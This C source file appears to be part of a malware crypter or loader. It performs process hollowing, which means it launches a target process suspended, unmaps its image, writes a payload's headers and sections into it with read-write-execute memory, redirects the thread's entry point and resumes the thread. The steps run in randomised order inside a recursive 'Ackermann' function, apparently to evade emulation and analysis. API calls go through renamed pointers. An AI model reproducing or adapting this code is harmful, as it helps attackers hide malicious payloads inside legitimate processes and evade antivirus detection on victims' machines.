#include "exec.h"

void init(void) {
	HCRYPTPROV m_hProv;
	int limit = 27;
	int count = 0;
	int exists;
	int i;
	int sort1, sort2, temp;
	BYTE b;

	i = fGetCryptCtx(&m_hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

	// Initialise the arrays
	
	do {
		// init;
		done[count] = FALSE;

		if(i != FALSE) {
			fCryptGenRandom(m_hProv, sizeof b, &b);
			limits[count] = b;
		}
		// Check if we have this value
		for( exists = 0; exists < count; exists++) {
			if(limits[exists] == limits[count]) {
				count--;
				break;
			}
		}
		count++;
	} while (count < 5);

	// Sort the limits (bubble)

	for(sort1 = 4; sort1 >= 0; sort1--) {
		for(sort2 = 1; sort2 <= sort1; sort2++) {
			if(limits[sort2 - 1] < limits[sort2]) {
				// Swap them around
				temp = limits[sort2 - 1];
				limits[sort2 - 1] = limits[sort2];
				limits[sort2] = temp;
			}
		}
	}
}

void Execute(int n, LPBYTE lpPayload) {
	int i;
	if(n == limits[0] && done[0] == FALSE) {
		DebugPrintA("Step: 1/5");
		ret = fCreateProc(NULL, szProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
		if(!ret) {
			DebugPrintA("exiting - createprocess %d", GetLastError());
			exit(1); 
		}
		fNTUnmap(pi.hProcess, (PVOID) pinh->OptionalHeader.ImageBase);
		done[0] = TRUE;
	}

	else if (n == limits[1] && done[1] == FALSE) {
		DebugPrintA("Step: 2/5");
		fVAlloc(pi.hProcess, (LPVOID) pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		ret = fWriteProcMem(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, &lpPayload[0], pinh->OptionalHeader.SizeOfHeaders, NULL);
		if(!ret) {
			DebugPrintA("exiting - writeprocessmemory %d", GetLastError());
			exit(1); 
		}
		done[1] = TRUE;
	}

	else if (n == limits[2] && done[2] == FALSE) {
		DebugPrintA("Step: 3/5");
		for(i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
			pish = (PIMAGE_SECTION_HEADER) &lpPayload[pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i];
			ret = fWriteProcMem(pi.hProcess, (LPVOID) (pinh->OptionalHeader.ImageBase + pish->VirtualAddress), &lpPayload[pish->PointerToRawData], pish->SizeOfRawData, NULL);
			if(!ret) {
				DebugPrintA("exiting - writeprocessmemory %d", GetLastError());
				exit(1);
			}
		}
		done[2] = TRUE;
	}

	else if (n == limits[3] && done[3] == FALSE) {
		DebugPrintA("Step: 4/5");
		fGetThrCtx(pi.hThread, &ctx);
		ctx.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
		done[3] = TRUE;
	}

	else if (n == limits[4] && done[4] == FALSE) {
		DebugPrintA("Step: 5/5");
		fSetThrCtx(pi.hThread, &ctx);
		res = fResumeThr(pi.hThread);
		if(res == -1) {
			DebugPrintA("exiting - resumethread %d", GetLastError());
			exit(1); 
		}
		done[4] = TRUE;
	}
}

int Ackermann(int start, int finish, LPBYTE lpPayload) {
	
	if ( (start == 0) && (finish >= 0) ) {
		return start + 1;
	}
	else if ( (start > 0) && (finish == 0) ) {
		return Ackermann(start - 1, 1, lpPayload);
	}
	else {
		Execute(finish, lpPayload);
		return Ackermann(start - 1, Ackermann(start, finish - 1, lpPayload), lpPayload);
	}
}
